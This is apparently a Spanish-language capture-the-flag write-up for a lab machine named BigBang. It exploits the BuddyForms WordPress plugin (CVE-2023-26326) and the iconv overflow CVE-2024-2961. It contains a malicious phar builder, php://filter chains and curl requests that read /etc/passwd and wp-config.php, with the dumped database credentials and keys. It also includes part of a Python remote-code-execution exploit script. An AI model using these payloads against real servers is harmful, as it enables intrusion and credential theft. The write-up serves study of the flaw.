Vulnerable a <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" target="_blank">CVE-2023-26326</a><br>
4. El Theme de Wordpress 'twentytwentyfour'<br>
Tiene la version desactualizada la actual ultima version es la  1.3<br>
Tiene el Directory listing habilitado, en la siguiente <a data-tooltip-position="top" aria-label="https://wordpress.org/themes/twentytwentyfour/" rel="noopener nofollow" class="external-link" href="https://wordpress.org/themes/twentytwentyfour/" target="_blank">ruta</a><br><br>Encontramos varias API's a los que el servidor envia peticiones:<br>http://blog.bigbang.htb/wp-admin/admin-ajax.php
http://blog.bigbang.htb/wp-admin/upload.php
<br><br><a data-tooltip-position="top" aria-label="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8" rel="noopener nofollow" class="external-link" href="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8" target="_blank">articulo</a><br><br>Bueno esta vulnerabilidad cosniste en subir un archivo .phar malicioso mediante upload_image_from_url y luego llamarlo con el wrapper phar://<br>Pruebo primero a subir un gif para verificar que funciona el exploit; el codigo defectuoso se puede examinar en este <a data-tooltip-position="top" aria-label="https://github.com/BuddyForms/BuddyForms/blob/master/includes/functions.php#L1488" rel="noopener nofollow" class="external-link" href="https://github.com/BuddyForms/BuddyForms/blob/master/includes/functions.php#L1488" target="_blank">enlace</a>;<br>
A pesar de subirse el archivo en formato .png podemos observar que el gif funciona en la pagina por lo que podremos subir un archivo phar malicioso que el servidor interprete como GIF<br><img alt="Pasted image 20250202141748.png" src="machines/bigbang/imgs/pasted-image-20250202141748.png"><br>dado esto procedemos  construir un exploit php<br>&lt;?php  
  
class Evil{  
  public function __wakeup() : void {  
    die("Arbitrary Deserialization");  
  }  
}  
  
  
//create new Phar  
$phar = new Phar('evil.phar');  
$phar-&gt;startBuffering();  
$phar-&gt;addFromString('test.txt', 'text');  
$phar-&gt;setStub("GIF89a\n&lt;?php __HALT_COMPILER(); ?&gt;");  
  
// add object of any class as meta data  
$object = new Evil();  
$phar-&gt;setMetadata($object);  
$phar-&gt;stopBuffering();
<br>Lo convertimos  a phar:<br>php --define phar.readonly=0 evil.php
➜  CVE-2023-26326 strings evil.phar 
GIF89a
&lt;?php __HALT_COMPILER(); ?&gt;
O:4:"Evil":0:{}
test.txt
text
GBMB
<br>Gif89a son los magic bytes  que van a enganar a la funcion del buddyforms upload_image_from_url() de tal forma que podremos exfiltrar nuestro php disfrazado de gif;<br>Ahora lo subimos al endpoint vulnerable que admite PUT<br>
wp-admin/admin-ajax.php<br><img alt="Pasted image 20250131141905.png" src="machines/bigbang/imgs/pasted-image-20250131141905.png"><br>
El servidor nos devuelve una URL indicando donde se ha subido nuestro archivo malicioso; Comprobamos que se ha subido correctamente navegando a la URL<br>
http://blog.bigbang.htb/wp-content/uploads/2025/01/<br><img alt="Pasted image 20250131142115.png" src="machines/bigbang/imgs/pasted-image-20250131142115.png"><br>Bueno pues tenemos injecion exitosa de archivos . ahora a construir el payload;<br>Dado que continuo este writeup de nuevo dia he vuelto a subir el phar al servidor esta vez se guarda como 1-2.png dado que no puedo <br><img alt="Pasted image 20250202143150.png" src="machines/bigbang/imgs/pasted-image-20250202143150.png"><br><br><a data-tooltip-position="top" aria-label="https://github.com/ambionics/wrapwrap" rel="noopener nofollow" class="external-link" href="https://github.com/ambionics/wrapwrap" target="_blank">Git</a><br>Vamos a usar wrapwrap para disfrazar el /etc/password en un archivo GIF anadiendo el GIF89a Header:<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py -h
usage: wrapwrap.py [-h] [-o OUTPUT] [-p PADDING_CHARACTER] [-f] path prefix suffix nb_bytes

Generates a php://filter wrapper that adds a prefix and a suffix to the contents of a file.

Example:

    $ ./wrapwrap.py /etc/passwd '&lt;root&gt;&lt;test&gt;' '&lt;/test&gt;&lt;/root&gt;' 100
    [*] Dumping 108 bytes from /etc/passwd.
    [+] Wrote filter chain to chain.txt (size=88781).
    $ php -r 'echo file_get_contents(file_get_contents("chain.txt"));'
    &lt;root&gt;&lt;test&gt;root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:2:2:bin:/bin:/usr/&lt;/test&gt;&lt;/root&gt;

positional arguments:
  path                  Path to the file
  prefix                A string to write before the contents of the file
  suffix                A string to write after the contents of the file
  nb_bytes              Number of bytes to dump. It will be aligned with 9

options:
  -h, --help            show this help message and exit
  -o OUTPUT, --output OUTPUT
                        File to write the payload to. Defaults to chain.txt
  -p PADDING_CHARACTER, --padding-character PADDING_CHARACTER
                        Character to pad the prefix and suffix. Defaults to `M`.
  -f, --from-file       If set, prefix and suffix indicate files to load their value from,
                        instead of the value itself

<br>Modificamos la evil_url para utilizar la cadena generada por wrapwrap , luego sube el archivo a través del endpoint vulnerable. Este método evita la restricción de tipo de archivo engañando al servidor para que interprete el archivo como una imagen. Con este enfoque, podemos realizar lectura de archivos arbitrarios y filtrar el contenido del archivo subido, que se supone que es una "imagen".<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '/etc/passwd' 'GIF89a' '' 500000 
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1444).
(venv) ➜  wrapwrap git:(main) ✗ cat chain.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────
       │ File: chain.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────
   1   │ php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-
       │ 32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-
       │ 32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv
       │ .CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.i
       │ conv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF
       │ 7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_
       │ JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.i
       │ conv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775
       │ |convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.
       │ UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|co
       │ nvert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert
       │ .iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.b
       │ ase64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSI
       │ SO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|conv
       │ ert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.
       │ IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|con
       │ vert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd
───────┴───────────────────────────────────────
<br>Ahora modificamos la evil_url para utilizar la cadena generada por wrapwrap , luego súbela a través del punto de entrada vulnerable. Esto evita la restricción de tipo de archivo al engañar al servidor para que interprete el archivo como una imagen. Con este método, podemos realizar con éxito la lectura de archivos arbitrarios, filtrando los contenidos del archivo subido (que se interpreta como una "imagen").<br>wrapwrap git:(main) ✗ export evil_url="$(cat chain.txt )" 

wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-4.png","attachment_id":159}%        

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-4.png' -o exploited.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   843  100   843    0     0   7500      0 --:--:-- --:--:-- --:--:--  7526
(venv) ➜  wrapwrap git:(main) ✗ strings exploited.png 
GIF89aroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologi

<br>Parece que estamos en un contenedor docker al no haber mas usuarios que root con el bash;<br>
vamos a intentar leer el wp-config con el mismo procedimiento:<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-config.php' 'GIF89a' '' 500000
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1449).
(venv) ➜  wrapwrap git:(main) ✗ export evil_url="$(cat chain.txt )"                     
(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-5.png","attachment_id":160}%  

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-5.png' -o wpconfig.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3348  100  3348    0     0  22633      0 --:--:-- --:--:-- --:--:-- 22775


(venv) ➜  wrapwrap git:(main) ✗ strings wpconfig.png 
GIF89a&lt;?php
 * The base configuration for WordPress
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 * This file contains the following configurations:
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 * @package WordPress
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wp_user' );
/** Database password */
define( 'DB_PASSWORD', 'wp_password' );
/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
 * Authentication unique keys and salts.
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 * @since 2.6.0
define( 'AUTH_KEY',         '(6xl?]9=.f9(&lt;(yxpm9]5&lt;wKsyEc+y&amp;MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK' );
define( 'SECURE_AUTH_KEY',  'F&lt;3&gt;KtCm^zs]Mxm Rr*N:&amp;{SWQexFn@ wnQ+bTN5UCF-&lt;gMsT[mH$m))T&gt;BqL}%8' );
define( 'LOGGED_IN_KEY',    ':{yhPsf}tZRfMAut2$Fcne/.@Vs&gt;uukS&amp;JB04 Yy3{`$`6p/Q=d^9=ZpkfP,o%l]' );
define( 'NONCE_KEY',        'sC(jyKu&gt;gY(,&amp;: KS#Jh7x?/CB.hy8!_QcJhPGf@3q&lt;-a,D#?!b}h8 ao;g[&lt;OW;' );
define( 'AUTH_SALT',        '_B&amp; tL]9I?ddS! 0^_,4M)B&gt;aHOl{}e2P(l3=!./]~v#U&gt;dtF7zR=~LnJtLgh&amp;KK' );
define( 'SECURE_AUTH_SALT', '&lt;Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te&lt;r^^Vh3KQ~B2c|~VvZ' );
define( 'LOGGED_IN_SALT',   '_zl+LT[GqIV{*Hpv&gt;]H:&lt;U5oO[w:]?%Dh(s&amp;Tb-2k`1!WFqKu;elq7t^~v7zS{n[' );
define( 'NONCE_SALT',       't2~PvIO1qeCEa^+J}@h&amp;x&lt;%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ' );
/**#@-*/
 * WordPress database table prefix.
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
$table_prefix = 'wp_';
 * For developers: WordPress debugging mode.
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
define( 'WP_DEBUG', false );
/* Add any custom values between this line and the "stop editing" line. */
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';


<br>Confirmamos que es un container dado que la base de datos se encuentra alojada en la 172.17.0.1 que es un rango IP que usa docker por defecto; vamos a sacar el wp-settings.php<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-settings.php' 'GIF89a' '' 500000
[+] Wrote filter chain to chain.txt (size=1451).

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-6.png","attachment_id":161}%  

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-5.png' -o wpsettings.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3348  100  3348    0     0   1592      0  0:00:02  0:00:02 --:--:--  1592
(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-settings.php' 'GIF89a' '' 500000
(venv) ➜  wrapwrap git:(main) ✗ strings wpsettings.png 

GIF89a&lt;?php
 * The base configuration for WordPress
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 * This file contains the following configurations:
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 * @package WordPress
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wp_user' );
/** Database password */
define( 'DB_PASSWORD', 'wp_password' );
/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
 * Authentication unique keys and salts.
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 * @since 2.6.0
define( 'AUTH_KEY',         '(6xl?]9=.f9(&lt;(yxpm9]5&lt;wKsyEc+y&amp;MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK' );
define( 'SECURE_AUTH_KEY',  'F&lt;3&gt;KtCm^zs]Mxm Rr*N:&amp;{SWQexFn@ wnQ+bTN5UCF-&lt;gMsT[mH$m))T&gt;BqL}%8' );
define( 'LOGGED_IN_KEY',    ':{yhPsf}tZRfMAut2$Fcne/.@Vs&gt;uukS&amp;JB04 Yy3{`$`6p/Q=d^9=ZpkfP,o%l]' );
define( 'NONCE_KEY',        'sC(jyKu&gt;gY(,&amp;: KS#Jh7x?/CB.hy8!_QcJhPGf@3q&lt;-a,D#?!b}h8 ao;g[&lt;OW;' );
define( 'AUTH_SALT',        '_B&amp; tL]9I?ddS! 0^_,4M)B&gt;aHOl{}e2P(l3=!./]~v#U&gt;dtF7zR=~LnJtLgh&amp;KK' );
define( 'SECURE_AUTH_SALT', '&lt;Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te&lt;r^^Vh3KQ~B2c|~VvZ' );
define( 'LOGGED_IN_SALT',   '_zl+LT[GqIV{*Hpv&gt;]H:&lt;U5oO[w:]?%Dh(s&amp;Tb-2k`1!WFqKu;elq7t^~v7zS{n[' );
define( 'NONCE_SALT',       't2~PvIO1qeCEa^+J}@h&amp;x&lt;%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ' );
/**#@-*/
 * WordPress database table prefix.
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
$table_prefix = 'wp_';
 * For developers: WordPress debugging mode.
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
define( 'WP_DEBUG', false );
/* Add any custom values between this line and the "stop editing" line. */
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
<br>CVE-2024–2961 | Buffer Overflow<br>Vamos a explotar la  vulnerabilidad CVE-2024–2961 , un buffer overflow presente en la biblioteca GNU libiconv. Esta vulnerabilidad permite ejecución remota de código (RCE) debido a una mala validación de entrada durante la conversión entre conjuntos de caracteres. Aunque el exploit es complejo y requiere conocimientos avanzados de explotación binaria, intentaremos desglosarlo paso a paso para facilitar su comprensión.<br>La vulnerabilidad fue descubierta en el contexto del plugin BuddyForms de WordPress, lo que la hace especialmente relevante para ataques web. Vamos a analizar cómo funciona esta vulnerabilidad desde una perspectiva técnica, centrándonos en los conceptos clave necesarios para su explotación.<br><br><br>libiconv es una biblioteca utilizada para convertir texto entre diferentes conjuntos de caracteres (charset). En PHP, muchas funciones de manipulación de cadenas dependen de esta biblioteca, especialmente cuando se usa la función iconv(). La vulnerabilidad radica en cómo libiconv maneja ciertos caracteres exóticos en el conjunto de caracteres ISO-2022-CN-EXT .<br><br>El conjunto de caracteres ISO-2022-CN-EXT utiliza secuencias de escape (ESC bytes, como \x1B) para cambiar dinámicamente entre diferentes codificaciones de caracteres. Cada carácter puede requerir hasta 4 bytes :<br>
<br>2 bytes para la secuencia de escape.
<br>2 bytes para el carácter codificado.
<br>Por ejemplo:<br>
<br>El carácter 劄 podría ser codificado como ESC $ * H (en formato hexadecimal: \x1B\x24\x2A\x48).
<br>Cuando libiconv procesa estos caracteres, debe escribir 4 bytes en el búfer de salida. Sin embargo, falta una verificación adecuada del tamaño del búfer , lo que puede provocar un desbordamiento de búfer si no hay suficiente espacio disponible.<br><br>Antes de profundizar en la explotación, es importante entender cómo funciona el manejo de memoria en PHP:<br><br>PHP utiliza funciones como emalloc(N) para asignar bloques de memoria de tamaño N y devuelve un puntero a esa memoria. Cuando un bloque ya no es necesario, se libera con efree(ptr).<br><br>El montón de PHP está dividido en regiones de 2MB , subdivididas en páginas de 4KB (0x1000 bytes) . Cada página almacena bloques (chunks) de un tamaño específico:<br>
<br>Página 10: Bloques de 0x100 bytes .
<br>Página 11: Bloques de 0x38 bytes .
<br>Y así sucesivamente...
<br>No hay metadatos entre bloques para rastrear asignaciones, lo que lo hace eficiente pero vulnerable a desbordamientos, ya que no hay verificaciones de seguridad entre bloques en el montón.<br><br>Los bloques liberados se añaden a listas libres (free lists), que son listas enlazadas simples (inseguras comparadas con listas doblemente enlazadas). Cuando se llama a efree(ptr), el bloque se agrega al inicio de la lista libre (comportamiento LIFO).<br>Si ocurre un desbordamiento en un bloque adyacente, se puede sobrescribir el puntero almacenado en el primer byte del bloque libre, alterando la estructura de la lista libre. Esto permite controlar dónde se asignará el siguiente bloque, lo que es crítico para la explotación.<br><br><br>El protocolo php://filter es ampliamente utilizado para aplicar filtros a recursos locales o remotos. Vamos a entender cómo PHP maneja este mecanismo:<br><br>Cuando PHP lee un recurso (por ejemplo, /etc/passwd), lo carga en un flujo representado por una brigada de cubetas (bucket brigade) :<br>
<br>Una brigada de cubetas es una lista enlazada doble de cubetas, donde cada cubeta contiene un búfer con una parte de los datos del recurso.
<br>Ejemplo: /etc/passwd podría estar dividido en:

<br>Cubeta 1: Primeros 5 bytes.
<br>Cubeta 2: Siguientes 30 bytes.
<br>Cubeta 3: Siguientes 1000 bytes.


<br><br>Los filtros (como string.upper) se aplican a las cubetas uno por uno:<br>
<br>PHP procesa cada cubeta, asignando un búfer de salida del mismo tamaño que el búfer de entrada.
<br>Por ejemplo, si el filtro es string.upper, los caracteres minúsculos en el búfer de entrada se convierten a mayúsculas en el búfer de salida.
<br>Se crea una nueva cubeta para los datos procesados.
<br><br>Una vez que se procesa una cubeta con un filtro, se crea una nueva brigada de cubetas con los resultados. El siguiente filtro se aplica a esta nueva brigada. Este proceso continúa hasta que todos los filtros se han aplicado.<br>Este mecanismo introduce potenciales vulnerabilidades:<br>
<br>Los filtros procesan datos en bloques, lo que los hace susceptibles a desbordamientos de búfer si las verificaciones de tamaño son insuficientes.
<br>Las cadenas de filtros aumentan la complejidad, permitiendo a los atacantes crear payloads intrincados.
<br><br><br>Nuestro objetivo es aprovechar la vulnerabilidad de desbordamiento de búfer en el filtro convert.iconv.XXX.ISO-2022-CN-EXT para lograr ejecución remota de código (RCE).<br><br>Con la explotación anterior, obtenemos la capacidad de leer archivos arbitrarios. Esto nos permite:<br>
<br>Leer binaries críticos como PHP, Apache y bibliotecas compartidas (ejemplo: libc) para análisis.
<br>Filtrar la distribución de memoria (/proc/self/maps) para revelar la disposición de la memoria del proceso en ejecución. Esto evita ASLR (Randomización del Espacio de Direcciones) y PIE (Ejecutables Independientes de Posición).
<br><br>A través del abuso de las cubetas, podemos asignar y liberar búferes casi arbitrariamente:<br>
<br>Usar zlib.inflate para crear múltiples cubetas.
<br>Redimensionar las cubetas con dechunk para alinearlas con los tamaños de bloques en el montón (por ejemplo, 0x100).
<br>Manipular la lista libre mediante la asignación, liberación y sobrescritura de punteros.
<br><br>Esta técnica permite manipular las cubetas de manera precisa para preparar la explotación (pon que las cubetas son muñequitas rusas ):<br>
<br>Lograr control total sobre qué escribir y dónde (write-what-where).
<br>Ejecutar comandos arbitrarios.
<br><br><br>
<br>
Solicitud 1 : Leer /proc/self/maps para filtrar:

<br>La disposición de memoria del proceso PHP (incluyendo la dirección del montón).
<br>La dirección base de libc para usar técnicas ROP.


<br>
Solicitud 2 : Descargar la versión coincidente de libc para extraer la dirección de la función system() y habilitar la ejecución de comandos arbitrarios con system('/bin/sh').

<br>
Solicitud 3 : Ejecutar el payload final:

<br>Desencadenar el desbordamiento.
<br>Manipular el montón.
<br>Ejecutar el comando.


<br><br><br>
<br>Implementa métodos para enviar solicitudes HTTP POST al endpoint vulnerable.
<br>Usa la cadena de filtros chain_prefix (los que usamos con wrapwrap) para engañar al sistema en la interpretación de datos.
<br>Permite descargar archivos remotos utilizando técnicas como php://filter.
<br>
<br>
check_vulnerable:

<br>Comprueba si los wrappers data://, php://filter y la extensión zlib están habilitados.
<br>Si alguno de estos no está disponible, el exploit no funcionará.


<br>
get_symbols_and_addresses:

<br>Lee el archivo /proc/self/maps para obtener las regiones de memoria del proceso PHP.
<br>Busca la dirección base de libc y el montón (heap) en la memoria.
<br>Descarga una copia local de libc.so.6 para analizar símbolos y direcciones específicas.


<br>
build_exploit_path:

<br>Construye el payload malicioso que explotará la vulnerabilidad.
<br>

<br>Creación de bloques (buckets) personalizados.
<br>Manipulación del heap mediante técnicas como dechunk y convert.iconv.
<br>Sobrescritura del puntero free_slot para controlar la asignación de memoria.




<br>
exploit:

<br>Envía el payload final al servidor objetivo.
<br>Espera un tiempo configurado (sleep) para verificar si el exploit fue exitoso.


<br><br>La clase Exploit es la parte principal del script. Contiene toda la lógica necesaria para construir y enviar el payload malicioso.<br><br>
<br>
check_vulnerable:

<br>Verifica si el sistema objetivo es vulnerable.
<br>Comprueba si los wrappers data://, php://filter y la extensión zlib están habilitados.
<br>Si alguno de estos no está disponible, el exploit no funcionará.


<br>
get_symbols_and_addresses:

<br>Lee el archivo /proc/self/maps para obtener las regiones de memoria del proceso PHP.
<br>Busca la dirección base de libc y el montón (heap) en la memoria.
<br>Descarga una copia local de libc.so.6 para analizar símbolos y direcciones específicas.


<br>
build_exploit_path:

<br>Construye el payload malicioso que explotará la vulnerabilidad.
<br>Utiliza técnicas avanzadas como:

<br>Creación de bloques (buckets) personalizados.
<br>Manipulación del montón mediante técnicas como dechunk y convert.iconv.
<br>Sobrescritura del puntero free_slot para controlar la asignación de memoria.




<br>
exploit:

<br>Envía el payload final al servidor objetivo.
<br>Espera un tiempo configurado (sleep) para verificar si el exploit fue exitoso.


<br>
from __future__ import annotations

import base64
import urllib.parse
import zlib
import urllib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:

    def __init__(self, url: str) -&gt; None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -&gt; Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """

        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus('php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource='+path),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)


    def send_exploit(self, payload: bytes) -&gt; Response:
        """Sends the payload to the server.
        """
        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus(payload),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)
        
    def download(self, path: str) -&gt; bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        file_path = self.send(path).json()['response']
        
        if 'File type' in file_path:
            print(file_path)
            return b''
        
        response = self.session.get(file_path)
        data = response.content[6:]
        return data

    def data_decode(self, data:bytes)-&gt;bytes:
        data = data.decode('latin-1')
        return base64.decode(data + (4 - len(data) % 4) * '=')

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

